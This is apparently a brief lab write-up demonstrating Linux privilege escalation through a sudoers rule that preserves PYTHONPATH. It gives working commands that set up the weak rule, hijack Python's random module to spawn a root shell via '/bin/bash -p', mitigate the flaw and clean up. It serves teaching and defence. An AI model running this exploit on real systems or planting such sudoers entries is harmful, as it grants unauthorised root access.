# Setup

```sh
# root
cp /etc/sudoers /etc/sudoers.bak
adduser attacker
echo "attacker ALL=(ALL) NOPASSWD: /usr/bin/python /home/attacker/script.py" >> /etc/sudoers
echo "Defaults env_keep += PYTHONPATH" >> /etc/sudoers
echo 'import random; print(random.randint(1, 10))' > /home/attacker/script.py
```

# Exploit

```bash
echo 'import os' > /tmp/random.py
echo 'os.system("/bin/bash -p")' >> /tmp/random.py

export PYTHONPATH=/tmp
sudo python /home/attacker/script.py
```


# Mitigate

```bash
# Remove env_keep += PYTHONPATH
```


# Clean Up

```bash
deluser attacker --remove-home
cp /etc/sudoers.bak /etc/sudoers
```